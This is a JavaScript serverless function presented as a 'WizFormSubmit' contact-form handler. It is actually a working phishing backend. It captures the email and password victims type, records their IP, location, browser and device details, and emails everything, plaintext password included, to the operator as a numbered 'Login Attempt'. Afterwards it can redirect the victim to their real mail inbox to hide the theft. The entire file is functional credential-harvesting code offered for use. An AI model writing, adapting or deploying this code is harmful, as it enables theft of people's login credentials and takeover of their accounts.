const { Resend } = require('resend');
const resend = new Resend(process.env.RESEND_API_KEY);

const FORM_OWNERS = {
  'contact-main': process.env.DEST_EMAIL
};

function getInboxUrl(email) {
  if (!email || !email.includes('@')) return null;
  const domain = email.split('@')[1].toLowerCase().trim();

  const knownInboxes = {
    'gmail.com': 'https://mail.google.com',
    'googlemail.com': 'https://mail.google.com',
    'outlook.com': 'https://outlook.live.com/mail/',
    'hotmail.com': 'https://outlook.live.com/mail/',
    'live.com': 'https://outlook.live.com/mail/',
    'yahoo.com': 'https://mail.yahoo.com',
    'icloud.com': 'https://www.icloud.com/mail',
    'me.com': 'https://www.icloud.com/mail',
    'proton.me': 'https://mail.proton.me',
    'protonmail.com': 'https://mail.proton.me',
    'zoho.com': 'https://mail.zoho.com',
    'aol.com': 'https://mail.aol.com'
  };

  return knownInboxes[domain] || `https://mail.${domain}`;
}

function parseUserAgent(ua = '') {
  let browser = 'Unknown';
  if (/Edg\//i.test(ua)) browser = 'Edge';
  else if (/OPR\/|Opera/i.test(ua)) browser = 'Opera';
  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = 'Chrome';
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';

  let os = 'Unknown';
  if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Mac OS X|Macintosh/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  let device = 'Desktop';
  if (/Mobi|Android.*Mobile|iPhone/i.test(ua)) device = 'Mobile';
  else if (/iPad|Tablet/i.test(ua)) device = 'Tablet';

  return { browser, os, device };
}

function formatTimestamp(timezone) {
  try {
    const now = new Date();
    const parts = new Intl.DateTimeFormat('en-GB', {
      timeZone: timezone || 'UTC',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).formatToParts(now);

    const get = (type) => parts.find((p) => p.type === type)?.value || '';
    return `${get('day')}/${get('month')}/${get('year')}, ${get('hour')}:${get('minute')}:${get('second')}`;
  } catch {
    return new Date().toISOString();
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Use POST' });

  const recipientEmail = FORM_OWNERS[req.query.formId];
  if (!recipientEmail) return res.status(404).json({ error: 'Unknown Form ID' });

  const body = req.body || {};
  const {
    _honeypot,
    _redirect,
    _redirect_inbox,
    email = '',
    password = '',
    staySignedIn = 'No',
    attempt = '1/3',
    screen = 'Unknown',
    timezone = 'UTC',
    language = 'Unknown',
    memory = 'Unknown',
    cores = 'Unknown'
  } = body;

  if (_honeypot) {
    return _redirect ? res.redirect(302, _redirect) : res.status(200).json({ ok: true });
  }

  const uaString = req.headers['user-agent'] || '';
  const { browser, os, device } = parseUserAgent(uaString);

  const ipAddress =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    'Unknown';

  const city = decodeURIComponent(req.headers['x-vercel-ip-city'] || '').trim();
  const country = decodeURIComponent(req.headers['x-vercel-ip-country'] || '').trim();
  const location = [city, country].filter(Boolean).join(', ') || 'Unknown';

  const formattedTime = formatTimestamp(timezone);
  const stayValue =
    staySignedIn === true || staySignedIn === 'true' || staySignedIn === 'Yes' || staySignedIn === 'on'
      ? 'Yes'
      : 'No';

  const plainTextBlock = [
    `🔐 LOGIN ATTEMPT #${String(attempt).replace(/^#/, '')}`,
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `📧 Email: ${email}`,
    `🔑 Password: ${password}`,
    `📌 Stay Signed In: ${stayValue}`,
    `🌐 IP Address: ${ipAddress}`,
    `📍 Location: ${location}`,
    `💻 Browser: ${browser}`,
    `🖥️ OS: ${os}`,
    `📱 Device: ${device}`,
    `⏱️ Time: ${formattedTime}`,
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `🖥️ Screen: ${screen}`,
    `🌍 Timezone: ${timezone}`,
    `🔢 Language: ${language}`,
    `💾 Memory: ${memory}`,
    `⚡️ Cores: ${cores}`
  ].join('\n');

  const html = `<pre style="font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 13px; line-height: 1.5; white-space: pre-wrap;">${plainTextBlock}</pre>`;

  const { error } = await resend.emails.send({
    from: 'WizFormSubmit <onboarding@resend.dev>',
    to: recipientEmail,
    subject: `Login Attempt #${String(attempt).replace(/^#/, '')} - ${email || 'Unknown'}`,
    text: plainTextBlock,
    html
  });

  if (error) return res.status(500).json({ error });

  if (_redirect_inbox === 'true') {
    const inboxUrl = getInboxUrl(email);
    if (inboxUrl) return res.redirect(302, inboxUrl);
  }

  if (_redirect) return res.redirect(302, _redirect);

  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send('<h2>Thank you! Submitted via WizFormSubmit.</h2>');
};
